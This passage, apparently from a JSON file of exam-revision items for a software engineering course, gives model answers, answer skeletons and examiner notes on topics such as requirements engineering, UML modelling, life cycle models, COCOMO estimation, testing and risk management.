negotiation — classify, prioritise and resolve conflicting stakeholder demands.\n3. Specification — record agreed requirements in an SRS using structured natural language, use cases or models.\n4. Validation — confirm the requirements are valid, complete, consistent, realistic and verifiable via reviews, prototyping and test generation.\n5. Requirements management — control change with requests, impact analysis and traceability.\nA good SRS is: complete (nothing missing), consistent (no contradictions), unambiguous, verifiable (each requirement testable), traceable (linked to design and tests), feasible, prioritised and uniquely identified.\nExample: \"The system should be fast\" is a bad line. \"The system shall confirm a seat booking within 3 seconds for 500 concurrent users\" is unambiguous, verifiable and traceable to test case T-21."},"se-39":{"u":6,"logic":"Tests whether the student can distinguish the 4+1 views from architectural patterns — a confusion that costs marks every year.","how":"Four views in one line each, plus scenarios, then three patterns as box sketch and a pros/cons pair.","skel":["Views: logical, process, development, physical, scenarios","One line per view; scenarios tie them together","Layered: presentation, business, persistence; substitutable layers","Repository: shared store, consistent but a bottleneck","Pipe and filter: sequential transforms, reusable, batch-like"],"ans":"Architectural views are separate descriptions of one architecture, each serving a different concern (Kruchten's 4+1):\n• Logical — classes and objects, the functional requirements.\n• Process — concurrent processes, threads, synchronisation, performance.\n• Development — modules, packages, libraries, the build structure.\n• Physical — hardware, nodes, deployment of components.\n• Scenarios (use cases) — the glue that validates the other four.\nPatterns:\n• Layered: stacked layers, each using only the one below — presentation, business logic, persistence. Pro: separation and substitutable layers. Con: extra hops and \"sinkhole\" layers that only pass calls through. Example: a three-tier ticketing web app.\n• Repository: all components share one central store. Pro: consistent data, no duplication. Con: the store is a bottleneck and single point of failure. Example: an IDE with a shared syntax tree.\n• Pipe and filter: data flows through sequential transformations. Pro: filters are reusable and composable. Con: poor for interactive work, conversion overhead. Example: payroll batch processing.\nDraw all three as boxes with arrows."},"se-40":{"u":1,"logic":"Checks that ethics is answered as professional obligations with a concrete dilemma, not as a list of moral adjectives.","how":"Public, client, product, profession, then confidentiality/competence/IP, then one real dilemma with the correct action.","skel":["Ethics = obligations beyond what the law requires","Eight ACM/IEEE principles, naming public interest first","Confidentiality, competence, IP respect, honest claims","Example: refusing to sign off a known safety defect","Weigh public interest above employer pressure"],"ans":"Software engineering ethics is the set of obligations a professional accepts beyond legal minimums, codified in the ACM/IEEE Software Engineering Code of Ethics: public interest, client and employer, product, judgement, management, profession, colleagues and self.\nIn practice:\n• Confidentiality — customer data is never reused or leaked.\n• Competence — no work beyond your skill without disclosure.\n• Intellectual property — no unlicensed code, no plagiarism.\n• Honesty — no false claims about capability or schedule; disclose risks.\nExample: a developer on a hospital records system finds the drug-interaction alert fails for one drug class while the manager wants to ship. The ethical action is to report it, document it and refuse sign-off, since public safety outranks the employer's schedule. Pushing client credentials to a public repository equally breaches confidentiality and must be disclosed and revoked."},"se-41":{"u":2,"logic":"A classic confusion: both are prototypes, but the examiner wants purpose and the fate of the artefact kept apart.","how":"Contrast purpose first, then documentation and risk. Close with the memory hook: throw-away explores, evolutionary delivers.","skel":["Throw-away: clarify requirements, then discard","Evolutionary: refined until it becomes the product","Throw-away used when requirements are unclear","Evolutionary used when the core is understood","Risk: wasted build vs poor structure"],"ans":"Both approaches cope with uncertainty by prototyping, but they differ in purpose and in the fate of the artefact.\n• Throw-away (rapid) prototyping builds a cheap mock-up only to clarify unclear requirements or test a risky idea, then discards it; the real system is built properly afterwards.\n• Evolutionary prototyping builds a working prototype from understood requirements and refines it version by version until it becomes the delivered system.\n• Documentation: throw-away needs none; evolutionary must be refactored and documented or it decays.\n• Risk: throw-away wastes effort but protects design quality; evolutionary risks a badly structured system with no architecture.\nExample: a clickable mock-up shown to a bus operator is throw-away; a ticketing app extended release by release is evolutionary."},"se-42":{"u":3,"logic":"Tests the plan-driven versus agile distinction on the axes that matter — requirement stability, documentation, change control, team size.","how":"Four paired contrasts in the order requirements, documentation, change, team. Add one line on which project each suits.","skel":["Requirements fixed in advance vs evolve continuously","Heavy documentation vs working software primary","Formal change control vs embrace change","Big design up front vs emergent design and refactoring","Fit: safety-critical and contracts vs fast product work"],"ans":"Plan-driven development separates specification, design, build and test, and measures progress against a plan made in advance. Agile development delivers in short increments and lets requirements emerge.\n• Requirements: plan-driven fixes them early; agile expects and welcomes change.\n• Documentation: plan-driven treats documents as deliverables; agile keeps them minimal, working software being primary.\n• Design: big design up front versus emergent design with continuous refactoring.\n• Change: formal change requests and a change control board versus a prioritised backlog.\n• Team: large distributed teams and fixed-price contracts versus small co-located teams with an on-site customer.\nPlan-driven fits safety-critical, regulated systems needing traceability; agile fits web products where the market shifts. Example: flight-control software is plan-driven; a food-delivery app is agile."},"se-43":{"u":4,"logic":"The second half is the discriminator: students list differences but cannot argue which class is more critical and why.","how":"Define both, give one example each, then commit: NFRs are more critical because they decide architecture and a miss is systemic.","skel":["Functional = what the system does, services and behaviour","Non-functional = constraints on how well it does it","Example pair: book a ticket vs respond in 2 seconds","NFRs decide architecture and are hard to retrofit","Missing an NFR fails the system, not one feature"],"ans":"A functional requirement states a service the system must provide — inputs, processing, outputs and error behaviour. A non-functional requirement states a quality or constraint the system must satisfy while providing those services.\n• Functional: \"The system shall let a passenger cancel a booking and refund the fare\" — traceable to a use case.\n• Non-functional: \"It shall handle 1,000 bookings a minute, respond within 2 seconds, be 99.9% available and encrypt card data with AES-256\" — performance, security, reliability, usability, maintainability and legal constraints.\nNon-functional requirements are usually the more critical: they shape the architecture and cannot be retrofitted. A system that books correctly but collapses at load or leaks card data has failed. A missing function is one feature short; a missing quality attribute is a systemic failure needing a rebuild."},"se-44":{"u":8,"logic":"Tests the testing levels as a hierarchy, specifically whether release testing is understood as developer-side black-box testing of a complete version.","how":"Define release testing, then contrast on purpose, scope, basis and output. Four pairs is enough for five marks.","skel":["Release testing = team tests a complete version before release","Black-box against requirements, not internal structure","System testing = whole system, functional plus non-functional","Release: go/no-go gate on the release package","Example: install and end-to-end scenario on v2.1"],"ans":"Release testing is testing by the development team on a complete version of the system intended for release outside the team. It is black-box: the system is judged against requirements and user expectations, not internal code.\nVersus system testing:\n• Purpose: system testing finds defects in the integrated system; release testing decides whether this build ships.\n• Scope: system testing covers functional and non-functional behaviour; release testing checks the whole package — installation, configuration, documentation, end-to-end scenarios.\n• Basis: requirements and test plan versus requirements plus realistic user scenarios.\n• Output: a defect log versus a signed go/no-go decision.\nExample: system testing proves seat limits are enforced; release testing proves v2.1 installs cleanly and a passenger completes booking, payment and cancellation."},"se-45":{"u":9,"logic":"Probes whether legacy means old-but-valuable rather than merely old, and whether the business risk of replacing it is understood.","how":"Define through the five embedded parts, then three importance points, then the five strategies in a single line.","skel":["Legacy = old system still supporting critical business","Parts: hardware, support software, application, data, processes","Importance: business value, embedded knowledge, replacement risk","High maintenance cost, scarce skills, security exposure","Strategies: scrap, maintain, re-engineer, wrap, migrate"],"ans":"A legacy system is an older system still essential to operations but difficult and expensive to change, because it rests on obsolete technology and its knowledge is buried in code. It has five parts: hardware, support software, application software, application data and the dependent business processes.\nImportance:\n• Business value — it runs payroll or billing; shutting it down stops the organisation. Nepali banks still run core banking on COBOL.\n• Embedded knowledge — rules accumulated over years exist nowhere else, so replacement loses them silently.\n• Risk and cost — replacement is expensive and failure visible, so organisations pay high maintenance for low quality.\n• Security and integration — unsupported platforms are a vulnerability and hard to connect to new systems.\nStrategies: scrap and replace, maintain, re-engineer, wrap with an API, or migrate gradually, judged by business value against system quality."},"se-46":{"u":5,"logic":"A drawing question: marks are for correct UML notation, actors, relationships and multiplicity — not for prose about buses.","how":"Draw use case first (actors outside the boundary), then the class diagram with attributes and multiplicities. Label everything.","skel":["Actors: Passenger, Booking Clerk, Administrator, Payment Gateway","Use cases: search, select seat, book, pay, cancel, report","Book includes Select Seat and Make Payment","Classes: Passenger, Bus, Trip, Seat, Ticket, Payment","One Trip has many Seats; one Ticket one Payment"],"ans":"Use case diagram (draw a boundary labelled Online Bus Ticketing):\n• Actors: Passenger on the left; Booking Clerk and Administrator on the right; Payment Gateway as a secondary actor.\n• Use cases: Search Bus, View Schedule, Select Seat, Book Ticket, Make Payment, Cancel Ticket, Print Ticket, Manage Schedule, Generate Report.\n• Relationships: Book Ticket «include» Select Seat and «include» Make Payment; Cancel Ticket «extend» Book Ticket; Admin links to Manage Schedule and Generate Report.\nClass diagram:\n• Passenger (passengerId, name, phone, email).\n• Bus (busNo, type, capacity) 1 —— * Trip (tripId, date, departureTime, fare).\n• Trip 1 —— * Seat (seatNo, status); Seat 1 —— 0..1 Ticket.\n• Ticket (ticketId, amount, status) * —— 1 Passenger; Ticket 1 —— 1 Payment (txnId, mode, status).\nPut a multiplicity on every association — a missing one loses a mark."},"se-47":{"u":5,"logic":"Checks that the student can name the three behavioural notations and read a state machine aloud, including guard conditions.","how":"Define, list the three diagram types, then walk one bus ticket through its states with an event on each arrow.","skel":["Behavioural model = dynamic behaviour over time","State machine: states, events, guards, transitions","Activity diagram: control flow, concurrency","Sequence diagram: message order between objects","Example: ticket reserved → paid → expired"],"ans":"A behavioural model shows the dynamic behaviour of a system as it executes — what states it can be in, which events cause a change, and in what order interactions occur. It follows the structural model and is expressed mainly in UML.\n• State machine — states as boxes, arrows labelled event [guard] / action; best for an object with a clear life cycle.\n• Activity diagram — flow of control and data through a process, with forks and joins for concurrency.\n• Sequence diagram — lifelines with time-ordered messages between actors and objects.\nExample — bus ticket: states Reserved, Paid, Cancelled, Expired. Reserve creates Reserved; payment within 10 minutes gives Paid; cancel gives Cancelled with a refund if paid; timeout gives Expired. The guard [seats available] on reserve prevents overbooking.\nDraw it with a filled circle start and a bullseye end."},"se-48":{"u":10,"logic":"A guaranteed algorithmic-estimation question; examiners want the three modes, the formula and one substitution, not the model's history.","how":"Formula line first, three modes with constants, one worked substitution, then intermediate and COCOMO II in a line each.","skel":["Effort = a × KLOC^b person-months; Time = c × Effort^d","Organic 2.4/1.05, semi-detached 3.0/1.12, embedded 3.6/1.20","Worked example: 33.6 KLOC semi-detached ≈ 152 PM","Intermediate: 15 cost drivers give an EAF","COCOMO II: scale factors and object points"],"ans":"COCOMO (Constructive Cost Model) is Boehm's algorithmic model that estimates effort and schedule from estimated size in KLOC.\nE = a × (KLOC)^b person-months; T = c × E^d months; staff = E / T.\n• Organic, small familiar team: a = 2.4, b = 1.05, c = 2.5, d = 0.38.\n• Semi-detached, medium: a = 3.0, b = 1.12, c = 2.5, d = 0.35.\n• Embedded, large with tight constraints: a = 3.6, b = 1.20, c = 2.5, d = 0.32.\nExample: 33.6 KLOC semi-detached → E = 3.0 × 33.6^1.12 ≈ 152 person-months; T = 2.5 × 152^0.35 ≈ 14.5 months; staff ≈ 10–11.\nIntermediate COCOMO multiplies effort by an Effort Adjustment Factor from 15 cost drivers (product, hardware, personnel, project). COCOMO II uses object points and scale factors."},"se-49":{"u":10,"logic":"A repeat of the 2080 SCM question — the paper recycles Group A items, so this is close to a certain mark if the phase walk is rehearsed.","how":"This repeats se-37 — a sure shot. Memorise the five-phase walk and the fare-change example, and write it tighter here.","skel":["SCM = identify, control, report, build and release","Requirements and design: versioned items, CCB, traceability","Code: branching prevents overwrite; commits attributable","Tests: versioned cases give reproducible failures","Example: fare change released as a numbered baseline"],"ans":"Software configuration management (SCM) identifies the items that form a product, controls their change, and records and reports their status throughout the life cycle. Activities are identification, version control, change control, status reporting and build/release.\nHow it facilitates change at each stage:\n• Requirements — every requirement and SRS version is a configuration item, so change is assessed by the change control board instead of absorbed silently.\n• Design — models are baselined; a traceability matrix shows which requirements and tests a change affects.\n• Implementation — branches isolate a change, so parallel work cannot overwrite code.\n• Testing — test cases are versioned with the build, so a defect is reproduced against the version that failed.\n• Release and maintenance — numbered baselines allow rollback and trace a field defect to the build that shipped.\nExample: the fare rule changes — a request is approved, the fare module is branched, requirement, design and tests are updated together, and the result ships as v2.1 while v2.0 stays for rollback.\nDraw: request → analysis → CCB → implement → test → baseline."},"se-50":{"u":2,"logic":"A broad comparison question; marks come from covering four or five models with genuine trade-offs rather than describing only the waterfall.","how":"One short block per model — waterfall, incremental, reuse-oriented, spiral, V — each with one pro and one con.","skel":["Waterfall: linear, simple, inflexible, costly change","Incremental: early value, needs good architecture","Reuse-oriented: fast and cheap, compromises requirements","Spiral: risk-driven loops, costly for small projects","V-model: each build level paired with a test level"],"ans":"A software life cycle model is the organised sequence of activities used to build a system.\n• Waterfall — requirements, design, implementation, testing, deployment, maintenance in strict order. Pro: simple, documented, clear milestones, suits fixed requirements and fixed-price contracts. Con: no working software until late; change is very expensive and risk surfaces late.\n• Incremental — built and delivered in usable increments. Pro: early value, feedback, lower risk, easier change. Con: needs a good initial architecture and refactoring; hard across large distributed teams.\n• Reuse-oriented — assemble from existing components and COTS. Pro: faster and cheaper, proven parts. Con: requirements compromised, no control over component evolution, vendor lock-in.\n• Spiral — risk-driven loops of objective setting, risk analysis, engineering and evaluation. Pro: explicit risk management for large projects. Con: expensive, needs risk expertise.\n• V-model — each development level pairs with a test level. Pro: verification planned early. Con: rigid when requirements move.\nChoose by requirement stability, size and contract type."},"se-51":{"u":4,"logic":"The 10-mark version adds \"types\" — most students repeat the 5-mark contrast and run out of material.","how":"Contrast in four lines, then functional types and NFR types as lists, then one system example covering both.","skel":["Functional = services and behaviour; NFR = quality constraint","Functional types: services, I/O, validation, business rules","NFR types: performance, security, reliability, usability, portability","NFR classes: product, organisational, external","Example: library system requirement pair"],"ans":"A functional requirement defines a service the system must provide — what it does. A non-functional requirement defines a constraint or quality it must satisfy — how well it does it.\nFunctional requirements include services (issue a book, calculate a fine), input and output (accept an ISBN, print a receipt), data validation (reject an invalid member), error handling and business rules (a loan lasts 14 days).\nNon-functional requirements fall into three classes:\n• Product — performance, response time, reliability, security, usability, storage, portability.\n• Organisational — standards, process, implementation language, delivery schedule.\n• External — legal, regulatory, ethical, interoperability, e.g. must use the national payment gateway.\nExample — a library system: \"The system shall record a loan and calculate the due date\" is functional; \"a search over 200,000 records shall return within 2 seconds for 50 concurrent users, and member data shall be encrypted at rest\" is non-functional. The first can be added in a later release; the second decides the architecture and must be designed in."},"se-52":{"u":7,"logic":"Tests component-based engineering as a build-from-parts discipline with a defined process, not just \"using libraries\".","how":"Define the component, give the five-step process, then four advantages with one word of justification each.","skel":["CBSE builds systems by assembling independent components","Component: deployable, replaceable, contract-based interfaces","Process: identify, select, adapt, compose, test","Advantages: reuse, faster delivery, proven quality, substitutable","Costs: integration effort and loss of vendor control"],"ans":"Component-based software engineering (CBSE) builds systems by composing independent, replaceable components that communicate through well-defined interfaces. A component exposes a provided and a required interface, so it is substituted without recompiling the rest.\nProcess: identify candidate components → select existing or COTS parts → adapt them with wrappers where interfaces differ → compose into the architecture → test the assembly.\nAdvantages:\n• Reuse — proven components cut effort and cost.\n• Faster delivery — assembly is quicker than writing.\n• Quality — widely used components have survived real use.\n• Maintainability — a faulty component is replaced, not debugged in place.\n• Independent evolution — one component can be upgraded or deployed alone.\nCosts: integration effort, mismatched interfaces and loss of control over the vendor's release cycle.\nExample: an e-commerce site assembled from a payment gateway, SMS notifier and authentication component."},"se-53":{"u":7,"logic":"The inverse of the usual reuse question; it rewards students who think about cost of ownership rather than only savings.","how":"Bullet each drawback with its consequence — compromise, integration cost, vendor control, hidden defects, licence risk.","skel":["Requirements compromise: component does not fit exactly","Integration and adaptation can cost more than building","No control over vendor upgrades and withdrawal","Hidden defects, missing documentation, licence risk","Organisational: not-invented-here, skills, legal checks"],"ans":"Software reuse — components, libraries, frameworks, COTS and whole systems — saves time but carries real drawbacks:\n• Requirements compromise: an existing component rarely fits exactly, so requirements are bent to it and the system only partly serves users.\n• Integration cost: interfaces mismatch, and adaptation or gluing code can cost more than writing the part.\n• Loss of control: the vendor controls the upgrade path, may withdraw the component, and forces unplanned migration.\n• Hidden defects: unknown bugs, possibly an abandoned component with no support; the team cannot diagnose internals.\n• Legal risk: GPL-style licences can force disclosure of your own code; COTS fees and audits add cost.\n• Organisational resistance: \"not invented here\" culture, plus effort to evaluate, certify and keep skills.\nReuse still pays for infrastructure and stable domains — but budget for evaluation and integration, not just acquisition."},"se-54":{"u":2,"logic":"Both are V-shaped and both emphasise testing or risk; the examiner wants the different axes — structure versus risk-driven iteration.","how":"One line on the shape of each, then four contrasts: driver, iteration, change, fit. Draw both quickly.","skel":["V-model: left leg design, right leg matching tests","Spiral: repeated loops of four quadrants, risk-driven","Driver: verification planning vs risk analysis","V is one pass; spiral iterates with prototypes","Fit: small stable projects vs large high-risk projects"],"ans":"V-model: the life cycle forms a V. The left leg descends through requirements, system design, architecture and module design; the right leg ascends through unit, integration, system and acceptance testing, each test level planned against the matching design level. It is one pass that makes verification planning explicit.\nSpiral: development proceeds in repeated loops, each with four quadrants — determine objectives, analyse risk, engineer the product, evaluate and plan the next cycle. It is iterative and risk-driven, producing a prototype each loop.\n• Driver: specification and verification versus risk analysis.\n• Iteration: one sequential pass versus repeated cycles.\n• Change: resisted once descended versus absorbed in the next loop.\n• Fit: small stable projects versus large high-risk ones.\nDraw both: a V with dotted cross-links, and a spiral with four quadrants."},"se-55":{"u":8,"logic":"The oldest testing favourite; the trap is treating them as synonyms or giving only the two slogans with no method.","how":"Two slogans, then four contrasts: question asked, activity, reference, timing. Close with the example that separates spec from need.","skel":["Verification: are we building the product right?","Validation: are we building the right product?","Verification static: reviews, inspections, walkthroughs","Validation dynamic: execution against real needs","Example: correct fare formula for the wrong policy"],"ans":"Verification asks \"are we building the product right?\" — does the work conform to its specification? Validation asks \"are we building the right product?\" — does it meet the user's actual needs?\n• Nature: verification is largely static, without execution; validation is dynamic, running the software.\n• Method: verification uses reviews, inspections, walkthroughs and static analysis; validation uses testing, prototyping, beta trials and acceptance testing.\n• Reference: verification compares the product with the specification; validation with user expectations, which may not be in the specification.\n• Timing: verification runs throughout development; validation runs on executed increments and before acceptance.\n• Failure: a verification failure deviates from spec; a validation failure means the spec was wrong.\nExample: a ticketing system implements \"fare = distance × rate\" correctly, so it passes verification; if the operator actually charges by seat class, only validation exposes the gap."},"se-56":{"u":10,"logic":"A repeat of the COCOMO question in cost-estimation wording; the examiner wants the model placed in estimation plus its accuracy limits.","how":"This repeats se-48 — a sure shot. Lead with the formula, then modes, one substitution, then accuracy limits.","skel":["Algorithmic model: effort from KLOC and project mode","E = a × KLOC^b; T = c × E^d","Three modes with their constants","Worked substitution giving person-months and duration","Accuracy depends on the size estimate; 15 drivers refine it"],"ans":"COCOMO estimates effort, duration and staffing from size in KLOC, adjusted for project complexity.\nE = a × (KLOC)^b person-months; T = c × E^d months; staff = E / T.\n• Organic: a = 2.4, b = 1.05, c = 2.5, d = 0.38.\n• Semi-detached: a = 3.0, b = 1.12, c = 2.5, d = 0.35.\n• Embedded: a = 3.6, b = 1.20, c = 2.5, d = 0.32.\nWorked example: 33.6 KLOC semi-detached → E = 3.0 × 33.6^1.12 ≈ 152 person-months; T = 2.5 × 152^0.35 ≈ 14.5 months; staff ≈ 10.5.\nIntermediate COCOMO multiplies effort by an Effort Adjustment Factor from 15 cost drivers — product, hardware, personnel, project — each rated very low to very high. COCOMO II replaces KLOC with object points and scale factors.\nLimitation: accuracy depends entirely on the size estimate, which is uncertain early."},"se-57":{"u":1,"logic":"Probes whether the student sees software engineering as an engineering discipline with cost and quality constraints, not applied computer science.","how":"Four paired contrasts — subject, goal, method, measure — then one line that SE applies CS results under constraints.","skel":["CS: theory of computation and algorithms","SE: building and delivering working software","CS asks what can be computed; SE how to build reliably","CS is mathematical; SE is process, people, cost","SE applies CS results under real constraints"],"ans":"Computer science studies computation — what can be computed, and with which algorithms, data structures and efficiency. Software engineering builds and delivers systems that are reliable, maintainable and affordable.\n• Focus: CS studies theory and fundamentals (algorithms, complexity, languages); SE studies the whole production process from specification to maintenance.\n• Goal: CS seeks correctness and efficiency of models; SE seeks a product delivered on time, within budget, at acceptable quality.\n• Method: CS is mathematical; SE is process- and people-driven, drawing on economics and management.\n• Measure: a proof or better algorithm versus a satisfied customer and maintainable code.\n• Scale: self-contained problems versus teams, legacy systems, changing requirements and deadlines.\nSE applies CS results — a sorting algorithm, a protocol, a type system — but adds engineering judgement about trade-offs. CS shows an O(log n) search exists; SE decides whether the optimisation is worth a sprint."},"se-58":{"u":9,"logic":"Tests the maintenance process as a controlled change cycle, not merely a list of the four maintenance types.","how":"Six steps from change request to release, then one line per maintenance type with its share. Never start with the types.","skel":["Maintenance = change after delivery; most of lifecycle cost","Change request → impact analysis → release planning","Implement, regression test, re-baseline, release","Types: corrective, adaptive, perfective, preventive","Draw the loop feeding back into the delivered system"],"ans":"Software maintenance is the modification of a system after delivery to correct faults, adapt to a changed environment or improve performance and maintainability. It consumes the majority of life-cycle cost.\n1. Change request — a defect report or enhancement is logged and identified.\n2. Impact analysis — find affected modules, estimate cost and risk, check the configuration baseline.\n3. Release planning — decide which changes enter the next release and in what priority.\n4. Implementation — modify code and design, refactoring degraded structure, keeping documentation in step.\n5. Testing — unit and regression tests confirm the change works and nothing else broke; items are re-baselined.\n6. Release — deliver the new version and record the change.\nTypes: corrective ≈20%, adaptive ≈25%, perfective ≈50%, preventive ≈5%.\nDraw the process as a loop back into the delivered system."},"se-59":{"u":10,"logic":"The trap is answering with testing alone; SQA is process-focused and must be distinguished from quality control.","how":"Define SQA as process assurance, list its activities, separate it from testing, then one concrete example.","skel":["SQA = planned activities ensuring the process meets quality","Not testing; testing is quality control of the product","Activities: standards, reviews, audits, metrics, training","An SQA plan fixes standards, checks, responsibilities","Example: mandatory review and coverage gate"],"ans":"Software quality assurance (SQA) is the set of planned and systematic activities that give confidence that the development process will produce a product meeting its quality requirements. It assures how work is done; quality control (testing, inspection) checks the product itself.\n• Standards — coding standards, documentation templates, ISO 9001 or CMMI definitions.\n• Reviews and audits — technical reviews of requirements, design and code, plus process audits.\n• Metrics — defect density, review effectiveness, test coverage and escaped defects, tracked over time.\n• Training and tools — the skills and tooling the process assumes.\n• An SQA plan — which standards apply, which reviews occur, who is responsible, what records are kept.\nExample: a team agrees no code merges without peer review and every module needs 80% branch coverage; the SQA lead audits pull requests and blocks release if a review is missing, so defects are caught at review, not in testing."},"se-60":{"u":5,"logic":"The 5-mark twin of se-33; the examiner wants a clean four-pair contrast without the importance discussion.","how":"This repeats se-33 — a sure shot. Four pairs only: content, notation, time, use. Keep it under ten lines.","skel":["Structural = static view of components and links","Behavioural = dynamic view of states and interactions","Structural diagrams: class, component, deployment","Behavioural diagrams: state, activity, sequence","Structural for design; behavioural for logic and tests"],"ans":"A structural model describes the static organisation of a system — its components and how they are connected. A behavioural model describes its dynamic behaviour — what happens over time when the system executes.\n• Content: classes, attributes, operations, associations and multiplicity versus states, events, transitions, guards and messages.\n• Notation: class, object, component, deployment and package diagrams versus state machine, activity, sequence and communication diagrams.\n• Timing: structural models ignore time; behavioural models are ordered in time and show concurrency.\n• Use: structural models guide design and schema; behavioural models verify logic, find dead states and generate tests from transitions.\nExample: the class diagram shows Ticket linked to Passenger and Trip; the state machine shows the same Ticket moving reserved → paid → cancelled → expired.\nDraw both small diagrams to make the contrast visible."},"se-61":{"u":5,"logic":"Asks for the whole of system modelling with one worked example; marks come from covering context, interaction, structural and behavioural views on a single system.","how":"Four model types, one line each, then apply all four to one system. Same example throughout — never switch systems.","skel":["System model = abstract view in UML or formal notation","Context model defines boundary and external actors","Interaction: use case and sequence diagrams","Structural: class diagram; behavioural: state and activity","Apply all four to a hospital appointment system"],"ans":"System modelling is the process of developing abstract models of a system, each presenting a different view of it, to help analysts understand and communicate what the system must do. Models are built mainly in UML before design begins.\nFour model types:\n• Context model — defines the system boundary and what lies outside it: the systems and actors it interacts with, drawn as a simple context diagram.\n• Interaction model — how system and environment interact: use case diagrams for what actors do, sequence diagrams for message order.\n• Structural model — the static organisation: class diagrams with attributes, operations, associations and multiplicity.\n• Behavioural model — dynamic behaviour: state machines for objects with a life cycle, activity diagrams for process flow, ERDs for data.\nExample — hospital appointments: the context model links the system to the patient portal, SMS gateway and billing system; the use case model shows Patient booking and Doctor viewing a schedule; the class model shows Patient, Doctor, Appointment, Slot and Prescription; the state machine shows an Appointment as requested → confirmed → attended → billed. Each view validates with a different stakeholder."},"se-62":{"u":2,"logic":"The most predictable 10-mark question in the paper; it tests the model with a diagram, merits and demerits rather than a definition only.","how":"Define process model, describe the five phases with a diagram, then four merits and four demerits. Draw first — it anchors the marks.","skel":["Process model = simplified representation of a process","Phases: requirements, design, implementation, testing, maintenance","Draw waterfall with feedback arrows","Merits: simple, documented, milestones, fixed-price fit","Demerits: inflexible, late feedback, costly change"],"ans":"A software process model is an abstract, simplified representation of a software process, describing the activities, their inputs and outputs, and the order in which they are carried out.\nThe waterfall model (Royce, 1970) arranges phases in strict sequence:\n1. Requirements analysis and specification — produce the SRS.\n2. System and software design — architecture and detailed design.\n3. Implementation and unit testing — code each module.\n4. Integration and system testing — assemble and test the whole.\n5. Deployment and maintenance.\nEach phase ends with review and sign-off before the next begins. Draw the phases as descending steps with feedback arrows.\nMerits:\n• Simple; clear milestones and deliverables.\n• Heavy documentation gives traceability and auditability.\n• Good fit for stable requirements and fixed-price contracts.\n• Progress is easy to measure — a phase is complete or not.\nDemerits:\n• Inflexible; late change is very expensive.\n• No working software until the end, so feedback arrives too late.\n• Risk is concentrated in the testing phase.\n• Customers must state all requirements up front.\nUse it for small, well-understood, regulated projects."},"se-63":{"u":10,"logic":"Two-part question: breadth of risk types plus depth on analysis. Students list risks but forget probability × impact and the matrix.","how":"Five risk types with an example each, then the four-step process, then expand analysis as probability × impact on the matrix.","skel":["Risk = chance of loss; manage by identify, analyse, plan, monitor","Types: technology, people, organisational, requirements, estimation","Analysis: probability × impact, ranked on a risk matrix","Classify: intolerable, tolerable, acceptable","Plan: avoid, reduce, transfer, accept, contingency"],"ans":"A risk is an adverse event that may occur and cause loss of schedule, cost or quality. Risk management identifies risks, analyses them, plans responses and monitors them throughout the project.\nTypes of risk:\n• Technology — unproven tools, unfamiliar platforms, integration failure.\n• People — staff turnover, illness, skill shortage, poor communication.\n• Organisational — budget cuts, reorganisation, loss of sponsor, supplier failure.\n• Requirements — scope creep, changing requirements, misunderstood needs.\n• Estimation — optimistic size and effort estimates, wrong COCOMO mode.\n• External — licence delays, cloud outage, regulatory change.\nRisk analysis stage: each risk gets a probability (very low to very high) and an impact on cost, schedule and quality, multiplied into an exposure score and ranked on a probability–impact matrix. Risks are classified as intolerable (must act), tolerable (act if affordable) or acceptable (monitor), and their triggers identified.\nResponses: avoidance, reduction, transfer through insurance or fixed-price contract, or acceptance with a contingency reserve.\nExample: a gateway that may miss certification scores high probability and impact, so a mock gateway is built and certification started early."},"se-64":{"u":4,"logic":"A clean three-way classification question; marks are lost when domain requirements are forgotten or confused with non-functional ones.","how":"Three definitions, three examples from one system, then one line on why domain requirements are the risky class.","skel":["Functional: services the system must provide","Non-functional: quality constraints on those services","Domain: derived from the application domain, often implicit","Example set from a hospital billing system","Domain requirements hardest to verify and easiest to miss"],"ans":"Requirements are classified as functional, non-functional and domain requirements.\n• Functional requirements — the services the system must provide, how it reacts to inputs, and how it behaves in particular situations. Example: \"The system shall let a patient book an appointment with a chosen doctor and cancel it up to 24 hours before.\" These map to use cases and are validated by testing.\n• Non-functional requirements — constraints on the services, concerning quality attributes: performance, security, reliability, availability, usability, maintainability, portability, and organisational or legal constraints. Example: \"Appointment search shall respond within 2 seconds for 200 concurrent users, and patient records shall be encrypted at rest.\" They often decide the architecture and must be measurable.\n• Domain requirements — derived from the application domain rather than user wishes; they may be functional or non-functional and often use domain terminology. Example: the billing module must apply national health-insurance co-payment rules and diagnostic codes, and prescriptions must follow the controlled-drug reporting rule.\nDomain requirements are the riskiest class: users assume them and never state them, and developers lack the domain knowledge to verify them."},"se-65":{"u":2,"logic":"Tests prototyping as a requirements-risk tool rather than a phase, and whether you can name the concrete techniques from Sommerville instead of saying 'we make a model'.","how":"Name three Sommerville techniques, one line each, then guidelines and a prototype-evaluate-refine loop; close with 'never ship it'.","skel":["Define: executable model to reduce requirement risk","Very high-level or scripting language prototypes","Database/4GL and component assembly techniques","Executable specification animation","Guidelines plus throw-away loop diagram"],"ans":"Rapid prototyping is the fast construction of an executable model of part of a system, built to clarify requirements, test a design idea or check feasibility. The prototype is a learning tool, not a deliverable.\n\nTechniques:\n• Very high-level and scripting languages (Python, JavaScript, Smalltalk): screens and logic working in days; best for UI and interaction experiments.\n• Database programming and 4GLs: use DBMS forms, report generators and query tools to prototype data-intensive systems quickly (a library issue desk built on MS Access).\n• Component and application assembly: wire existing widgets, libraries or COTS packages into a prototype; fastest where the domain is standard.\n• Executable specification: animate a formal or model-based specification so users can see the behaviour.\n\nGuidelines: keep it throw-away, restrict it to what is being studied, ignore non-functional requirements, and never ship it. Draw the loop: build prototype → users evaluate → refine; its purpose is to remove requirement risk while change is still cheap."},"se-66":{"u":4,"logic":"Probes formal-methods literacy: separating algebraic from model-based specification, and structuring an interface specification into signature, semantics and exceptions.","how":"Write the stack push/pop pre- and post-conditions first, then the three parts of an interface; the example carries most of the marks.","skel":["Define formal spec: mathematically defined syntax and semantics","Algebraic (axioms) vs model-based (state, pre/post)","Interface = signature + semantics + exceptions","Worked push/pop with pre- and post-conditions","Use: safety and security-critical systems"],"ans":"Formal specification describes requirements or design in a language with mathematically defined syntax and semantics (Z, VDM, B, algebraic specifications). Being unambiguous and analysable, it is used in safety- and security-critical systems — rail signalling, medical devices, avionics — where a requirements defect is unacceptable.\n\nTwo styles: algebraic, where the system is an abstract data type and operations are defined by axioms (pop(push(s,x)) = s); and model-based, where an explicit state with an invariant is changed by operations given as pre- and post-conditions.\n\nInterface specification defines what a component offers, so users need not see its internals. Three parts:\n• Signature — operation name, parameter types, result types.\n• Semantics — what it does, as a pre-condition (assumed on entry) and post-condition (guaranteed on exit).\n• Exceptions — error conditions and the exceptions raised.\nExample: push(S, x): pre not 